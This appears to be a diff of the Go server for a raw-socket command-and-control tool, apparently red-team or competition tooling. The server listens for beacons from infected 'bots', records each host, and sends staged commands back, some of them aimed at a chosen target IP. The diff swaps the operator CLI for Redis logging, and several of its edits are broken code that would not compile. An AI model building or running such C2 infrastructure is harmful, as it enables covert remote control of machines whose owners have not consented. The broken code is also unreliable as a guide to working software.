@@ -1,21 +1,28 @@
 package main
 
 import (
-	"bufio"
+	// "bufio"
 	"fmt"
 	"log"
 	"net"
 	"os"
 	"strconv"
 	"strings"
+	"time"
+	"io"
+	// "net/http"
+	"encoding/json"
 
 	"github.com/google/gopacket"
 	"github.com/DaveTheBearMan/Keydra/socket"
 	"golang.org/x/sys/unix"
+	"github.com/redis/go-redis/v9"
 )
 
 // Global to store staged command
 var stagedCmd string
+var startTime time.Time
+var rdb redis.Client
 
 // Glabal to store target info
 var targetIP string
@@ -31,10 +38,23 @@ type Host struct {
 	DstPort  int
 }
 
-// PwnBoard is used for updating pwnboard
-type PwnBoard struct {
-	IPs  string `json:"ip"`
-	Type string `json:"type"`
+// Write host
+func writeLog(streamKey String, event String, message String) {
+	args := &redis.XAddArgs{
+        Stream: streamKey,
+        MaxLen: 1000,
+        Approx: true,
+        Values: map[string]interface{}{
+            "event":   event,
+            "message": message,
+            "time":   time.Now().Format(time.RFC3339),
+        },
+    }
+
+	_, err := rdb.XAdd(ctx, args).Result()
+    if err != nil {
+        log.Fatalf("XAdd failed: %v", err)
+    }
 }
 
 // sendCommand takes
@@ -43,28 +63,28 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 	// Forever loop to respond to bots
 	for {
 		// Block on reading from channel
-		bot := <-listen
+		client := <-listen
 
 		// Check if there is a command to run
 		// Make a socket for sending
 		fd := socket.NewSocket()
 
 		// Create packet
-		// fmt.Println("SRC MAC:", iface.HardwareAddr)
-		// fmt.Println("DST MAC:", dstMAC)
-		// fmt.Println("SRC IP:", myIP)
-		// fmt.Println("DST IP:", bot.RespIP)
+		// writeLog(fmt.Sprintf("SRC MAC:", iface.HardwareAddr)
+		// writeLog(fmt.Sprintf("DST MAC:", dstMAC)
+		// writeLog(fmt.Sprintf("SRC IP:", myIP)
+		// writeLog(fmt.Sprintf("DST IP:", client.RespIP)
 		if targetcommand != "" {
-			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
-			packet := socket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
+			writeLog("TRAFFIC", fmt.Sprintf("Sending target cmd", targetIP, targetcommand))
+			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
 			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
 		} else {
-			packet := socket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, socket.CreateCommand(stagedCmd))
+			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateCommand(stagedCmd))
 			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
 		}
 		// YEET
 		if stagedCmd != "" {
-			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
+			writeLog("TRAFFIC", fmt.Sprintf("Sent reponse to:", client.Hostname, "(", client.IP, ")"))
 			// Close the socket
 			unix.Close(fd)
 		} else {
@@ -75,17 +95,16 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 
 // ProcessPacket TODO:
 func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
-
 	// Get data from packet
 	data := string(packet.ApplicationLayer().Payload())
 	payload := strings.Split(data, " ")
 
-	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
+	// writeLog(fmt.Sprintf("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
 
 	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
 	if err != nil {
-		fmt.Println("[-] ERROR PARSING MAC:", err)
+		writeLog("ERROR", fmt.Sprintf("ERROR PARSING MAC:", err))
 		return
 	}
 
@@ -102,78 +121,63 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		DstPort:  dstport,
 	}
 
-	// fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
+	writeLog("TRAFFIC", fmt.Sprintf("Recieved From:", newHost.Hostname, "(", newHost.IP, ")"))
+	err = writeHostToFile(newHost)
+	if err != nil {
+		writeLog("ERROR", fmt.Sprintf("ERROR WRITING HOST:", err))
+		return
+	}
+
 	// Write host to channel
 	listen <- newHost
 }
 
-// Simple CLI to update the "stagedCmd" value
-func cli() {
-	for {
-		// reader type
-		reader := bufio.NewReader(os.Stdin)
-
-		fmt.Print("socket> ")
-		stagedCmd, _ = reader.ReadString('\n')
-		// Trim the bullshit newlines
-		stagedCmd = strings.Trim(stagedCmd, "\n")
-		if stagedCmd == "TARGET" {
-			stagedCmd = ""
-			// Get the target IP
-			fmt.Print("Enter IP to target> ")
-			targetIP, _ = reader.ReadString('\n')
-			targetIP = strings.Trim(targetIP, "\n")
-
-			// Get TARGET command
-			fmt.Print("TARGET COMMAND> ")
-			targetcommand, _ = reader.ReadString('\n')
-			targetcommand = strings.Trim(targetcommand, "\n")
-		}
-		fmt.Println("[+] Staged CMD:", stagedCmd)
-		if targetcommand != "" {
-			fmt.Println("[+] Target CMD:", targetcommand, "on box", targetIP)
-		}
-	}
+func connectToDb() {
+	rdb = redis.NewClient(&redis.Options{
+		Addr: "localhost:6379",
+	})
 }
 
-func main() {
-
+func initializeRawSocketServer() {
+	// Hosts file
+	startTime = time.now()
+	filePath = "hosts.json"
 	// Create a BPF vm for filtering
-	vm := socket.CreateBPFVM(socket.FilterRaw)
+	filterVM := socket.CreateBPFVM(socket.FilterRaw)
 
-	// Create a socket for reading
+	// Create a unix file socket for reading
 	readfd := socket.NewSocket()
 	defer unix.Close(readfd)
 
-	fmt.Println("[+] Created sockets")
+	writeLog("DEBUG", fmt.Sprintf("Created sockets"))
 
 	// Make channel buffer by 5
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
 	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
-	fmt.Println("[+] Interface:", iface.Name)
+	writeLog("DEBUG", fmt.Sprintf("Interface:", iface.Name))
 
 	dstMAC, err := socket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println("[+] DST MAC:", dstMAC.String())
+	writeLog("DEBUG", fmt.Sprintf("DST MAC:", dstMAC.String()))
 
 	// Spawn routine to listen for responses
-	fmt.Println("[+] Starting go routine...")
+	writeLog("DEBUG", "Starting go routine...")
 	go sendCommand(iface, myIP, dstMAC, listen)
-
-	// Start CLI
-	go cli()
 
 	// This needs to be on main thread
 	for {
 		// packet := socket.ServerReadPacket(readfd, vm)
-		packet := socket.ServerReadPacket(readfd, vm)
-		// Yeet over to processing function
+		packet := socket.ServerReadPacket(readfd, filterVM)
 		if packet != nil {
 			go serverProcessPacket(packet, listen)
 		}
 	}
+}
+
+func main() {
+	initializeRawSocketServer()
 }
